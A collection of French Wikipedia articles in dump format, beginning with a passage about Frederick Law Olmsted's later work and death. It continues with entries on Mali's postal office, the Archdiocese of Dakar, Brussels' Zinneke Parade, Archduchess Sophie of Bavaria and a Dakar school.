Le directeur de l'exposition Daniel Burnham prend en charge le projet et Frederik Olmsted est chargé de transformer le paysage. Olmsted reconstitue partiellement ses dessins d'il y a plus de vingt ans et les utilise pour créer un nouveau plan de transformation de la zone. Un réseau de lagunes artificielles et de canaux rappelant les lagunes vénitiennes est creusé. Une île artificielle et vallonnée a été érigée entre les plans d'eau, où les futurs visiteurs pourront se détendre dans le silence de la nature. Chaque pavillon d'exposition était équipé d'une entrée supplémentaire du côté du plan d'eau, le long de laquelle circulaient de petits bateaux électriques, stylisés comme des sampans asiatiques colorés. Pendant les mois les plus chauds de l'année, Olmsted recherche des plantes aquatiques appropriées le long des rivières et des lacs de l'Illinois et du Wisconsin : saules, callunes, joncs et chèvrefeuilles, qu'il plante ensuite le long des berges des canaux.
D'avril à septembre 1892, Olmsted voyage à nouveau en Europe. Ce voyage est en partie dû à des problèmes de santé : en raison d'un épuisement nerveux, l'architecte âgé souffre d'insomnie, de névralgie faciale, d'acouphènes. Pendant le voyage, il passe plusieurs semaines dans la maison d'un spécialiste des maladies nerveuses à Hampstead Heath, dans la banlieue de Londres, où il est traité avec des sédatifs. Le reste du temps, Olmsted s'intéresse plus que jamais aux détails de l'architecture européenne nécessaires à son travail professionnel. Il visite le site de l'exposition précédente à Paris, où il escalade la tour Eiffel, construite spécialement pour l'occasion. Dans la vallée de la Loire, il s'intéresse aux châteaux locaux ; dans la vallée de la Tamise, à la végétation fantaisiste de pervenches, qui doit être reproduite à Chicago.
Autres projets.
Alors que la construction du manoir Vanderbilt et des pavillons d'exposition à Chicago est en cours, le maître entreprend des commandes dans d'autres villes. De nouveaux parcs municipaux sont conçus à Milwaukee (Wisconsin), Bridgeport (Connecticut), Detroit (Michigan), Trenton (New Jersey), Rochester (New York), Louisville (Kentucky) et dans d'autres villes américaines. Le plan de la commune de Druid Hills près d'Atlanta reprend le concept urbanistique de la banlieue de Riverside à Chicago, développé en 1869. Le campus de l'université Stanford est utilisé pour concevoir les campus de nombreux établissements d'enseignement supérieur aux États-Unis.
Dernières années de vie.
En 1895, Olmsted commence à montrer des signes de démence avancée : forte baisse de la mémoire, irritabilité et incapacité à se concentrer sur une tâche simple. En mai de cette année, il interrompt inopinément un nouveau voyage de travail au "Biltmore", qui s'avère être le dernier de sa carrière professionnelle. La famille a tenté d'améliorer l'état de l'architecte en le changeant d'environnement et en le tenant à l'écart des nouvelles du monde extérieur. Cependant, ni l'isolement sur l'île de Deer Isle dans le Maine, ni un voyage chez un médecin en Grande-Bretagne cette fois-ci n'y font rien : la maladie progresse rapidement et n'apporte aucune tranquillité à la famille et aux amis. Après des tentatives d'aide infructueuses, Olmsted est placé en septembre 1898 dans la clinique psychiatrique McLean à Belmont, où il restera jusqu'à la fin de sa vie. Frederick Olmsted meurt le 28 août 1903 et est enterré au cimetière Old North dans sa ville natale de Hartford dans le Connecticut.
Principes généraux de conception.
S'inspirant du paysagisme et du jardinage anglais, Olmsted a mis l'accent sur une conception qui encourage la pleine utilisation des caractéristiques naturelles d'un espace donné, son "génie" ; la subordination des détails individuels à l'ensemble, de sorte que les éléments décoratifs ne prennent pas le dessus, mais que l'ensemble de l'espace soit mis en valeur ; la dissimulation de la conception, une conception qui n'attire pas l'attention sur elle-même ; une conception qui agit sur l'inconscient pour produire la détente ; et l'utilité ou la finalité plutôt que l'ornementation. Un pont, un sentier, un arbre, un pâturage : tous les éléments sont réunis pour produire un effet particulier.
Olmsted a principalement conçu des projets dans les styles pastoral et pittoresque, chacun visant à produire un effet particulier. Le style pastoral présentait de vastes étendues de verdure avec de petits lacs, des arbres et des bosquets et produisait un effet apaisant et réparateur sur l'observateur. Le style pittoresque couvre des terrains rocailleux et accidentés, parsemés d'arbustes et de lianes, afin d'exprimer la richesse de la nature. Le style pittoresque joue avec la lumière et l'ombre pour donner au paysage une impression de mystère.
Les paysages sont conçus pour renforcer la sensation d'espace : limites indistinctes à l'aide de plantes, de broussailles et d'arbres, au lieu de limites nettes ; jeux d'ombre et de lumière de près, et détails flous de loin. Il a utilisé une vaste étendue de verdure au bout de laquelle se trouve un bosquet de peupliers jaunes ; un chemin qui serpente à travers un morceau de paysage et en croise d'autres, divisant le terrain en îlots triangulaires de nouveaux points de vue successifs.
La subordination s'est efforcée d'utiliser tous les objets et toutes les caractéristiques au service de la conception et de l'effet recherché. Cela se voit dans l'utilisation subtile de plantes naturelles dans l'ensemble du parc. Les espèces non indigènes plantées pour leur propre singularité ont été considérées comme allant à l'encontre de l'objectif de la conception, car cette singularité même attirerait l'attention sur elle alors que l'intention est de permettre la relaxation : l'utilité avant tout était un objectif. La séparation s'applique aux zones conçues dans des styles différents et pour des usages différents, ce qui renforce la sécurité et réduit les distractions. L'une des principales caractéristiques de Central Park est l'utilisation de chemins creux qui traversent le parc et sont spécifiquement dédiés aux véhicules, par opposition aux allées sinueuses réservées aux piétons.
Un bel exemple de ce mélange de principes se trouve dans le Central Park Mall, une grande promenade menant à la Bethesda Terrace et l'unique élément formel de la conception naturaliste originale d'Olmsted et Vaux. Les concepteurs ont écrit qu'une ""grande promenade" était une "caractéristique essentielle d'un parc métropolitain"" ; cependant, sa symétrie formelle, son style, même s'il s'agit d'une aberration, a été conçu de manière à être subordonné à la vue naturelle qui l'entoure. Les passagers fortunés descendaient de leur voiture à l'extrémité sud. La calèche faisait alors le tour jusqu'à la Terrasse, qui donnait sur le lac et le Ramble, pour venir les chercher, ce qui leur évitait de devoir faire le chemin inverse à pied. La Promenade était bordée d'ormes élancés et offrait une vue sur Sheep Meadow.
Les New-Yorkais aisés, qui se promenaient rarement dans le parc, se mêlaient aux moins fortunés dans les quartiers de la terrasse, et tous profitaient d'une échappatoire à l'agitation de la ville environnante. Cependant, les plus riches d'entre eux ont fait appel à l'entreprise pour aménager leurs propriétés de campagne de manière similaire, pour leur plaisir privé, comme c'est le cas pour Frederick T. van Beuren Jr. dans le New Jersey. Il est le descendant d'un médecin néerlandais qui s'est installé à Manhattan en 1700 et dont les membres de la famille sont devenus d'éminents propriétaires dans la ville et dans d'autres lieux. À l'origine, ce domaine était l'un des nombreux lieux de retraite autosuffisants que la famille possédait à Manhattan et qui comprenait une ferme pour les produits agricoles, le bétail et une écurie, ainsi que plusieurs maisons pour le personnel permanent. Le domaine devint plus tard une résidence plus permanente lorsque la carrière de van Beuren s'orienta vers la fondation d'un hôpital dans la communauté grandissante des environs. À cette époque, la structure en bardeaux de New Vernon est rénovée en une structure en briques qui est décrite comme l'un des manoirs les plus remarquables de la région. Au moment de la rénovation, le plan d'aménagement paysager de la résidence n'est pas modifié. L'élargissement de Spring Valley Road à la fin du a fait disparaître certains aménagements paysagers d'Olmsted, notamment une cascade de fougères indigènes bordant une partie de la propriété le long de la route, de Blackberry Lane à l'éponyme van Beuren Road, qui divise la propriété familiale de sa limite nord à sa limite sud, à Blue Mill Road.
Le cabinet d'Olmsted.
Au cours de sa vie, Frederick Olmsted a fondé plusieurs entreprises commerciales d'architecture paysagère. Le premier d'entre eux, Olmsted, Vaux &amp; Company, a été créé avec Calvert Vaux en 1865. Plusieurs projets de grande envergure à Brooklyn, Buffalo et Chicago ont été réalisés sous la direction de cette société. Après avoir rompu avec son associé en 1872, Olmsted travailla indépendamment pendant plusieurs années, collaborant surtout avec d'autres architectes, ingénieurs et horticulteurs. En 1884, lorsque son activité professionnelle devient l'une des plus recherchées du pays, il fonde sa propre entreprise, qui perdure sous une enseigne ou une autre jusqu'en 1979.
Pratiquement tous les projets d'Olmsted à partir de 1884 sont réalisés au sein de son entreprise et avec le soutien de ses employés. Le nom original de l'entreprise était "F. L. Olmsted &amp; J. C. Olmsted". L'idée est née du neveu et fils adoptif de Frederick, John Charles Olmsted, qui a suivi les traces de son père et est devenu son associé. En 1889, un autre associé de l'architecte est son apprenti Henry Sargent Codman. Après la mort prématurée de Codman en 1893, un autre élève du maître, Charles Eliot, lui succède et le cabinet devient Olmsted, Olmsted &amp; Eliot. Cependant, Eliot, comme Codman, mourut à un âge avancé, alors que son maître était encore en vie en 1897. Un an plus tard, alors que Frederick Law Olmsted, malade en phase terminale, avait déjà pris sa retraite, John et son plus jeune fils Rick (Frederick Law Olmsted Jr.) reprirent les affaires de la société, qui devint Olmsted Brothers. Les affaires des frères se sont rapidement développées et, avec l'arrivée de la Grande Dépression à la fin des années 1920, le nombre d'employés de l'entreprise est passé à 2500 personnes. Le cabinet est crédité de centaines de commandes d'architecture paysagère, principalement pour la conception de parcs municipaux et d'autres espaces publics.

</doc>
<doc id="568619" url="https://fr.wikipedia.org/wiki?curid=568619" title="Office national des postes">
Office national des postes

L’Office national des postes (ONP), alias La Poste du Mali, est un établissement public, responsable du service postal malien, désigné pour remplir les obligations découlant de l'adhésion à la Convention de l'Union Postale Universelle.
Réglementation.
Il est créé en 1989, à la suite du démantèlement de l’Office des postes et des télécommunications entre d’un côté l’ONP et de l’autre de la Société des télécommunications au Mali (SOTELMA).
Activités.
En 1990, les missions de l’ONP sont recentrées autour du courrier et des transferts de fond avec le retrait de ses compétences des activités para-bancaires. 
L’ONP est présent sur le territoire malien à travers 107 « points de contacts » (78 bureaux de poste, 10 guichets annexes et 19 correspondances postales).
Au , la dette de l’ONP s’élevait à 3,8 milliards de Francs CFA.
En 2008, l'ONP a inauguré un centre de technologie Postale dirigé par Séga Diarrah

</doc>
<doc id="568620" url="https://fr.wikipedia.org/wiki?curid=568620" title="Archidiocèse de Dakar">
Archidiocèse de Dakar

L'archidiocèse de Dakar est une circonscription ecclésiastique de l'Église catholique au Sénégal, érigée canoniquement en archidiocèse le par le pape .
Cet archidiocèse est actuellement dirigé par André Gueye.
Histoire.
La préfecture apostolique des Deux Guinées et Sénégambie (appelée également préfecture apostolique de Guinée Supérieure et Inférieure et de Sierra Leone) est créée le , par détachement du diocèse de Funchal au Portugal. Elle est érigée en vicariat apostolique en 1846.
Ce dernier est divisé le pour donner naissance d'une part au "vicariat apostolique des Deux Guinées" et d'autre part au "vicariat apostolique de Sénégambie". 
En 1897, le vicariat sénégambien est à nouveau divisé pour permettre l'érection de la préfecture apostolique de la Guinée française. En 1931, est créée la "mission sui juris" de Gambie. En 1939, une autre partie est séparée pour créer la préfecture de Ziguinchor et en 1957 pour la préfecture de Kaolack. Entretemps, le , le vicariat apostolique avait été élevé par au rang d'archidiocèse métropolitain de Dakar. Le diocèse de Thiès est érigé en 1969 à partir de paroisses de l'archidiocèse. 
Le catholicisme progresse rapidement dans la métropole de Dakar, parce que les catholiques n'étaient que 3 % de la population totale en 1949, alors qu'ils sont 14 % aujourd'hui. Il y a plus de fidèles et 151 prêtres catholiques dans trente-huit paroisses à Dakar, mais le nombre de vocation sacerdotales n'augmente pas en mesure de la croissance du nombre de fidèles. Il y a au total 570 religieux et religieuses à Dakar.
Principales églises.
L’église principale de l’archidiocèse est la cathédrale Notre-Dame-des-Victoires de Dakar.
On trouve sur le territoire de l’archidiocèse le sanctuaire Notre-Dame-de-la-Délivrande de Popenguine, reconnu sanctuaire national par la Conférence des évêques du Sénégal, de la Mauritanie, du Cap-Vert et de Guinée-Bissau depuis son inauguration le , qui est construit autour de la basilique Notre-Dame-de-la-Délivrande, reconnue basilique mineure en .

</doc>
<doc id="568625" url="https://fr.wikipedia.org/wiki?curid=568625" title="Zinneke Parade">
Zinneke Parade

La Zinneke Parade est une parade biennale en ville de Bruxelles, une manifestation culturelle organisée par Zinneke qui rassemble lors de chaque édition environ 2 500 paradeurs. La parade est le résultat d'un long processus de rencontres et de création collective entre amateurs et artistes professionnels, d'âges, d'origines et de milieux différents. Les paradeurs sont réunis en une vingtaine de spectacles déambulatoires et attirent entre et .
Zinneke.
Zinneke asbl-vzw est l'organisation qui crée des espaces ouverts de rencontres, collaborations et créations qui vise à mettre en place une dynamique artistique et sociale entre habitants, associations et écoles, collectifs et initiatives, artistes et amateurs dans les différents quartiers de Bruxelles et d'ailleurs. Une multitude de projets artistiques sont ainsi élaborés à partir de l'imaginaire et des propositions des participants en ateliers d'une variété des disciplines artistiques. Ces projets, appelés 'Zinnodes' sont composés d'une équipe artistique, de plusieurs partenaires et des dizaines de participants.Des spectacles se forment durant un long processus de création participative au sein des ateliers qui mène à un travail cohérent commun en rapport avec le thème de la Zinneke Parade. 
Historique.
La Zinneke Parade a été créé pour la première fois dans le cadre de Bruxelles 2000, Capitale européenne de la culture, avec le but d'organiser un carnaval multiculturel, un événement créatif et participatif « susceptible de réconcilier la population bruxelloise avec son identité ».
'Zinneke' est un surnom choisi pour représenter les gens de Bruxelles. Le mot se référait à l'origine aux chiens errants de la ville qui traînaient dans les rues du côté de la Petite Senne (un bras de la Senne qui longeait les murs de la ville) jusqu'à la fin du XIXe siècle.

</doc>
<doc id="568628" url="https://fr.wikipedia.org/wiki?curid=568628" title="Giessen">
Giessen

Giessen est le nom de villes situées en Allemagne, France et aux Pays-Bas.

</doc>
<doc id="568636" url="https://fr.wikipedia.org/wiki?curid=568636" title="Sophie de Bavière">
Sophie de Bavière

Frédérique Sophie Dorothée Wilhelmine de Wittelsbach, duchesse de Bavière puis archiduchesse d'Autriche, princesse de Bohème et de Hongrie, née le à Munich et morte le à Vienne, est un membre par alliance de la maison de Habsbourg-Lorraine, « le seul homme de la famille » disait d'elle le chancelier Metternich. Elle est la mère des empereurs François-Joseph d'Autriche et Maximilien du Mexique.
Biographie.
Maison de Wittelsbach.
Membre de la maison de Wittelsbach, Sophie et sa sœur jumelle, Marie, sont les filles de l'électeur Maximilien IV de Bavière, futur roi de Bavière sous le nom de Maximilien 1er, et de sa seconde épouse, Caroline de Bade.
L'an 1805 qui commence par la naissance des deux princesses bavaroises se termine par la victoire des Français à Austerlitz. Napoléon impose à l'empereur d'Autriche le démantèlement du quasi-millénaire Saint-Empire romain germanique, sur lequel il règne depuis 1792. L'Autriche ne conserve que les possessions patrimoniales de son souverain, et doit céder le Tyrol et le Vorarlberg donnés à la Bavière qui, comme ses voisins Badois, Wurtembergeois et Saxon, choisit le camp français.
L'empereur des Français crée alors de toutes pièces une « confédération du Rhin », dont il s'attribue la fonction de « protecteur », et à laquelle la Bavière et ses voisins adhèrent sans rechigner. La Bavière, le Wurtemberg et la Saxe deviennent également des royaumes tandis que Bade, dont le soutien à la politique française n'a pas été jugé suffisante, n'est fait que grand-duché.
Soucieux d'une véritable union avec les familles royales d'Europe, Napoléon envisage de marier ses proches aux membres de grandes dynasties : tandis qu'une fille du roi de Wurtemberg est mariée à Jérôme Bonaparte, promu par son frère roi d'un royaume de Westphalie créé ex nihilo, le grand-duc héritier de Bade épouse Stéphanie de Beauharnais, une nièce du premier mari de l'impératrice Joséphine, adoptée Napoléon et donc créée princesse impériale. La sœur aînée de Sophie, Augusta-Amélie de Bavière, épouse en 1806 Eugène de Beauharnais, fils de Joséphine, adopté lui aussi par l'empereur des Français et promu vice-roi d'Italie à Milan. La duchesse Marie-Élisabeth en Bavière, une cousine de la branche cadette, est mariée en 1808 au maréchal Berthier, promu en 1806 au rang de prince (prince de Neuchâtel et de Valangin, puis après la bataille de Wagram en 1809, de Neuchâtel, de Valagin et de Wagram), qui représente l'empereur de Français à Vienne lors des cérémonies du second mariage par procuration du souverain avec l'archiduchesse Marie-Louise. Toutefois, lorsque Napoléon envisage d'unir le prince héritier de Bavière à une de ses parentes, le jeune homme est rapidement marié à une princesse de sang royal, bien que d'une Maison secondaire et protestante. 
À la chute de l'Empire français, le roi de Bavière ayant opportunément rallié les Alliés, conserve son royaume et son titre et, pour faire oublier son passé « bonapartiste », marie ses filles cadettes aux vainqueurs du jour. Caroline-Auguste, après un mariage annulé avec le prince héritier de Wurtemberg, épouse en 1816 l'empereur François Ier d'Autriche, veuf pour la troisième fois ; Élisabeth épouse en 1820 le roi Frédéric-Guillaume IV de Prusse ; Marie-Léopoldine et Amélie sont chacune à leur tour reines de Saxe. Seule, la benjamine Ludovica ne porte pas couronne, elle est mariée pour des raisons familiales à un cousin d'une branche cadette, le duc Maximilien en Bavière. .
Ainsi, Sophie est également la tante (et belle-mère) de l'impératrice Élisabeth d'Autriche, la célèbre « Sissi », de la reine Marie des Deux-Siciles et de la duchesse d'Alençon.
Mariage.
, Sophie épouse le à Vienne l'archiduc François-Charles d'Autriche, homme faible, sans beauté et sans charme, mais apparemment promis au trône impérial, son frère Ferdinand en étant visiblement incapable. En revanche, le jeune archiduc, passionné de chasse, est très amoureux de sa très jolie épouse. N'ayant aucun goût pour le pouvoir ni la politique, il est un époux et un père dévoué voire soumis.
La jeune fille est accueillie chaleureusement par son beau-père et en même temps beau-frère, l'empereur François .
Descendance.
Après six années de tentatives infructueuses, dont quatre fausses-couches (notamment en 1827 et en 1829), de donner naissance à un enfant – un handicap politique –, le couple en a finalement six :
L'archiduchesse est une mère aimante et attentionnée, particulièrement attentive à l'éducation donnée à ses enfants. La mort de sa fille Marie-Anne à l'âge de cinq ans la laisse inconsolable.
Au cœur des rumeurs.
Si certains ragots non fondés prétendent que le prince de Vasa serait le père de l'empereur François-Joseph, des propos plus courants affirment que le père de son second fils, Ferdinand-Maximilien, n'était autre que le neveu de son mari, le duc de Reichstadt, fils de Napoléon. Il n'était que de six ans son cadet, et elle lui était intimement liée : elle fut, dit-on, le grand amour de l'Aiglon et l'assista dans ses derniers jours. Membre à part entière de la Maison d'Autriche par sa mère l'archiduchesse Marie-Louise d'Autriche devenue duchesse régnante de Parme, et traité avec affection par son grand-père l'empereur François, le duc de Reichstadt mais rien ne permet d'affirmer qu'ils furent amants, bien que l'empereur Napoléon III le crut. Avant de partir pour le Mexique, l'archiduc Maximillien prétendait être le petit-fils illégitime de Napoléon . Pourtant, aucune source n'a jamais pu vérifier la véracité de ces déclarations. Dans le journal que Sophie tenait depuis son enfance, on retrouva des déclarations d'amour et une particulière affection envers le jeune duc de Reichstadt, sans, pourtant, aucune affirmation ou mot laissant entendre une possible histoire d'amour entre les deux.
De même, comme dit précédemment, l'archiduchesse sympathisa avec un cousin utérin, le prince de Vasa, fils du roi détrôné Gustave IV de Suède et de Frédérique de Bade. De six ans son aîné, le prince était officier dans l'armée impériale. D'une belle prestance et d'une grande beauté, il l'emportait largement sur l'archiduc François-Charles, quelque peu victime de la consanguinité. Rien ne permet de confirmer les rumeurs qui firent de l'archiduchesse et du . . En revanche, la princesse Amélie de Suède, sœur du prince de Vasa, fut agréée comme dame de compagnie de l'archiduchesse. Les deux femmes tissèrent des liens d'amitié qui durèrent jusqu'à la mort de la princesse en 1853.
Par ailleurs, la famille paternelle de Sophie devait beaucoup à l'ex-empereur des Français ; Sophie ne cacha jamais son admiration pour Napoléon ni son affection pour son beau-frère Beauharnais. Mais elle concevait également la France comme la mère des idées révolutionnaires, et ne cachait pas son mépris pour les différents régimes qui succédèrent à la Restauration. Sophie rend régulièrement visite aux exilés de Frohsdorf (Madame Royale, le dauphin, Henri d’Artois et sa sœur Louise).
Le roi Louis , frère aîné de l'archiduchesse, fonda la pinacothèque de Munich et se rendit célèbre par sa Galerie des beautés où il fit figurer le portrait de sa sœur.
Archiduchesse d'Autriche.
Cependant, elle trouve en face d'elle, le chancelier de l'empire, le prince de Metternich qui gouverne depuis 1810 : il se méfie de cette jeune archiduchesse ambitieuse à la forte personnalité qui pourrait lui faire de l'ombre si un jour elle était l'épouse de l'empereur. Confronté aux capacités très limitées de son héritier, l'archiduc Ferdinand, homme d'un caractère doux et aimable mais à la limite de la débilité, l'empereur songeait effectivement à transmettre la couronne à son fils cadet l'archiduc François-Charles. Celui-ci aurait dû à la mort de son père devenir empereur d'Autriche et Sophie impératrice. Le chancelier Metternich évoqua alors le principe dynastique pour s'opposer à cette substitution. Le chancelier voyait dans le monarque plus l'institution que l'homme et il craignait aussi d'avoir à compter avec Sophie, dont le mari était à sa dévotion. D'ailleurs le chancelier, après la naissance de l'archiduc François-Joseph, avait incité l'empereur à conserver ses droits à la couronne à l'archiduc Ferdinand et à le marier alors qu’il approchait de la quarantaine, afin de procréer et d'éloigner Sophie du trône. Avec Ferdinand, un empereur faible, marié à une femme sans intérêt pour les affaires politiques comme l'archiduchesse Marie-Anne, Metternich put ainsi conserver la haute main sur la politique autrichienne durant les treize années suivant la mort de l'empereur François , période de l'histoire appelée le Vormärz. Limitée donc dans ses ambitions, l'archiduchesse reporte ses espoirs sur son fils appelé à succéder à son oncle. Reconnaissant la valeur du chancelier, elle se rapproche de lui et lui confie une partie de l'éducation de son fils, François-Joseph, en qui elle voit déjà le futur empereur.
Bien que quatre de ses sœurs soient souveraines (deux reines de Saxe et une reine de Prusse, une impératrice d'Autriche), et que son frère Louis soit roi de Bavière, Sophie est la véritable tête de la famille Wittelsbach. En 1840, l'archiduchesse perd sa seule fille, qui meurt de maladie à l'âge de 5 ans. L'archiduchesse est inconsolable. En octobre de la même annėe, elle fait une fausse couche. En 1841, l'archiduchesse perd sa mère. La reine douairière de Bavière, née Caroline de Bade était un soutien et une confidente pour l'archiduchesse qui ressentit douloureusement cette disparition. Enceinte pour la , elle met au monde un quatrième fils, l'archiduc Louis-Victor d'Autriche son dernier enfant, et commence à tenir un journal.
Durant la période Biedermeier, l'archiduchesse fut une figure éminente du monde viennois. Son salon était réputé ouvert aux artistes et elle y reçut, entre autres Franz Liszt et Johann Strauss qui lui consacra une valse. Une des salles de bals les plus fréquentées de Vienne portait son nom, la "Sophiensaal." En 1827, le rosiériste français Jean-Pierre Vibert lui dédie une rose créée en 1824 par Cottin, la rose « princesse Sophie de Bavière ».
Se posant résolument comme la championne de la tradition, elle s'opposa avec succès aux projets de mariage du duc d'Orléans, héritier du « roi des barricades » et petit-fils d'un prince régicide, avec l'archiduchesse Marie-Thérèse, fille de l'archiduc Charles-Louis (qui épouse en 1837 le roi Ferdinand II des Deux-Siciles).
Sophie savait également former autour d'elle un cercle familial chaleureux dans ce monde curial qui l'était si peu.
Révolution de 1848.
La révolution de 1848 chasse Metternich du pouvoir et l'oblige à l'exil le . La Hongrie se soulève et le roi Charles-Albert de Sardaigne, profitant des difficultés de l'empire autrichien, lui déclare la guerre. La famille impériale se réfugie à Innsbruck puis à Prague et, après l'assasinat du ministre de la guerre Theodor Baillet von Latour, à Olmütz.
Cependant, ayant conscience que la monarchie devait se rénover et que, seul, un jeune souverain pourrait faire face aux troubles causés par les révolutions nationales, l'archiduchesse Sophie, avec la complicité de sa sœur, l'impératrice douairière, veuve de François d'Autriche, et de sa belle-sœur, l'impératrice Marie-Anne, obtient que son mari, l'archiduc François-Charles, trop faible de caractère pour assumer la fonction impériale, renonce à ses droits à la couronne, et que son beau-frère l'empereur Ferdinand abdique en faveur de François-Joseph : ce fut le « complot des Dames ».
L'archiduchesse accorde son soutien au forces conservatrices et à la répression conduite par le général-comte von Grünne, les princes Felix zu Schwarzenberg et Alfred de Windisch-Graetz.
Influence auprès de François-Joseph.
Par son caractère et sa fermeté, ainsi que grâce à l'appui des ultramontains, Sophie asseoit les débuts du règne de son fils aîné sur un régime absolutiste et autoritaire qui s'appuie sur l'armée et le clergé catholique. Le Concordat de 1855, qui met un terme à la politique joséphiste autrichienne et renforce le contrôle du clergé sur la société, la réjouit. Cependant cette politique se heurte aux résistances des différentes nationalités qui peuplent l'empire, et aux échecs en politique extérieure. L'empereur est contraint d'adhérer au parlementarisme et de reconnaître une large autonomie à la Hongrie. Déplorant l'évolution de la politique autrichienne, minée par les échecs, l'archiduchesse ne s'efface du pouvoir qu'à l'approche de la mort.
Après avoir écarté l'archiduchesse Elisabeth dont l'empereur s'était épris mais qui cumulait les handicaps politiques - issue de la branche hongroise, veuve d'un prince de la branche de Modène et mère d'une petite fille -, elle souhaite affaiblir la Prusse en mariant une nièce du roi, la princesse Anne de Prusse, à l'empereur. Mais les Hohenzollern ne veulent pas d'une alliance avec les Habsbourg-Lorraine et l'archiduchesse se tourne vers sa Bavière natale, seconde puissance catholique de la Confédération germanique après l'Autriche. Cependant, François-Joseph, faisant preuve pour la première fois d'indépendance, n’épouse pas la fiancée désignée par sa mère, Hélène en Bavière mais sa sœur, dont il est tombé éperdument amoureux, Elisabeth de Wittelsbach, dite « Sissi ».
Les autres fils se marient aussi selon leur cœur. Le troisième Charles-Louis épouse en 1856 la duchesse Marguerite de Saxe, une cousine saxonne qui meurt prématurément, puis la princesse Maria-Annunziata des Deux-Siciles, une cousine sicilienne en exil qui meurt après lui avoir donné quatre enfants, et enfin une princesse de Bragance, fille de l'ex-roi du Portugal, elle aussi exilée, Marie-Thérèse de Portugal.
Ferdinand-Maximilien, le second, épouse très diplomatiquement une princesse ni Allemande, ni Hongroise, ni Slave, ni Italienne : Charlotte, fille du roi des Belges.
Dernières années et mort.
La défaite de l'Autriche face à la Sardaigne, alliée de la France, qui permet la création du royaume d'Italie en 1861, puis celle de 1866 face à la Prusse qui exclut l'Autriche de la sphère germanique, le Diplôme d'octobre 1860 qui met fin au néo-absolutisme, le compromis austro-hongrois de 1867, victoire de l'impératrice Élisabeth et la révision du concordat sous l'impulsion de la majorité libérale de la diète consacrent la mort politique de l'archiduchesse. La mort tragique de son fils Maximilien, l'empereur du Mexique, fusillé en 1867 à Queretaro après un procès inéquitable la brise. La guerre franco-prussienne de 1870/1871, qui consacre l'unification de l'Allemagne sous l'égide de la Prusse, la confine un peu plus dans une solitude morale. Elle se rend alors à Possenhofen chez sa sœur Ludovika mais s'y trouve confrontée à une famille endeuillée : Hélène, veuve éplorée mais digne de son mari, mort prématurément, et le duc Charles-Théodore, dont la jeune épouse Sophie de Saxe est morte à l'âge de 22 ans, laissant une fille, Amélie Marie.
L'archiduchesse se retire peu à peu du monde. Elle n'assiste pas au couronnement de son fils et de sa belle-fille à Budapest. Elle ne pardonna jamais à Napoléon III d'avoir entraîné son fils dans l'aventure mexicaine, puis de l'avoir abandonné, et refuse de le rencontrer lors de la visite de condoléances que celui-ci fait à Vienne quelque temps plus tard. Elle salue cependant la bravoure des troupes bavaroises pendant la guerre franco-prussienne, mais déplore l'inféodation de sa patrie à la Prusse. Enfin, la mort prématurée de sa belle-fille l'archiduchesse Maria-Annunziata, qui laisse l'archiduc Charles-Louis veuf pour la seconde fois à l'âge de 38 ans avec quatre enfants en bas âge, affecte fortement l'archiduchesse. Elle soutient son fils et se consacre à sa vie familiale, notamment à ses petits-enfants, l'archiduchesse Gisèle et le Kronprinz Rodolphe ainsi qu'aux enfants de la défunte Maria-Annunziata, les archiducs François-Ferdinand dont elle note le caractère nerveux, Othon et Ferdinand-Charles et la petite Marguerite née en 1870.
En 1872, elle assiste aux fiançailles de sa petite-fille, l'archiduchesse Gisèle à peine âgée de 15 ans, avec le prince Léopold de Bavière. Tout en respectant les convenances sociales, cette union est un mariage d'inclination auquel l'impératrice a largement contribué. Une fois encore Habsbourg-Lorraine et Wittelsbach s'allient mais, tout en se réjouissant du bonheur des amoureux, l'archiduchesse, fidèle à elle-même, conclut : « politiquement, ce mariage ne vaut rien ».
Sans se départir de sa dignité, l'archiduchesse meurt d'une pneumonie le à l'âge de 67 ans. Elle sera veillée jusqu'à sa mort par l'Impératrice Elisabeth, sa belle-fille.
Dans la culture.
Le cinéma – notamment l'œuvre de Ernst Marischka – a laissé de l'archiduchesse Sophie (interprétée par Vilma Degischer) l'image d'une femme politique au caractère ferme et autoritaire. Les diplomates disaient qu’elle était « le seul homme de la famille impériale ». Ce caractère bien trempé se heurta très vite à la personnalité indépendante de sa jeune belle-fille et nièce, l'impératrice Élisabeth.
L'archiduchesse Sophie n'était pas la méchante femme présentée parfois : son principal souci était la grandeur de l'Autriche et de sa maison souveraine, ce qui explique qu'elle n'hésita pas à inspirer à son fils une politique réactionnaire, autoritaire, centralisatrice et cléricale.
La révolution de 1848, qui ébranla fortement le principe monarchique, l'effraya mais ne lui fit pas perdre contenance. Ayant compris qu'une période nouvelle était advenue, elle préféra renoncer au trône en y plaçant son fils aîné à peine sorti de l'adolescence : « Adieu ma jeunesse » aurait dit l'empereur de 18 ans.
Si elle avait renoncé au trône, l'archiduchesse n'avait pas renoncé au pouvoir. À peine cinq ans plus tard, l'archiduchesse cherchait pour son fils l'empereur François-Joseph une union capable de renforcer la monarchie danubienne. La princesse Hélène en Bavière, dix-neuf ans, sage, pieuse et cultivée, fut choisie. Les deux promis ne furent consultés que pour la forme.
Mais l'archiduchesse dut s'incliner devant la volonté de son fils, décidé à choisir lui-même son épouse : Elisabeth, la duchesse Elisabeth Amélie Eugénie en Bavière — plus connue sous le surnom de « Sissi » (en allemand : Sisi) — pas plus consultée que sa sœur sur le sujet.
Comme toujours, l'archiduchesse s'adapta, disposée à aimer sa belle-fille mais se montra très exigeante avec elle. Celle-ci, élevée très librement, ne put s'adapter à la cour et à la rigidité du protocole. De son côté, femme de devoir, l’archiduchesse ne pouvait comprendre que l'impératrice fît passer ses sentiments avant les devoirs de l'État.
Au seuil de la vieillesse, les déboires politiques et familiaux qui l'atteignirent finirent par briser cette femme forte. Les défaites militaires de 1859 et 1866, le Diplôme d'octobre 1860 qui mettait fin à l'absolutisme, la révision du concordat moins favorable au clergé et la création de l'Autriche-Hongrie, signèrent l'échec de sa vision politique. La catastrophe mexicaine qui fut fatale à son fils préféré la brisa. L'unification de l'Allemagne sous l'égide de la Prusse, à laquelle la Bavière avait dû prêter son concours, fut aussi une humiliation et un chagrin.

</doc>
<doc id="568638" url="https://fr.wikipedia.org/wiki?curid=568638" title="Cours Sainte-Marie de Hann">
Cours Sainte-Marie de Hann

Le cours Sainte-Marie de Hann à Dakar est un établissement scolaire de l'archidiocèse de Dakar qui est sous tutelle des pères maristes.
L'établissement compte environ 5000 élèves et 200 professeurs. L'établissement compte des élèves de 50 nationalités différentes et 4 religions distinctes, dont une majorité de musulmans.
L'établissement offre la possibilité aux parents d'inscrire leurs enfants dans le programme sénégalais ou français ou encore bilingue (homologué par le ministère français de l'Éducation nationale et conventionné avec l'AEFE).
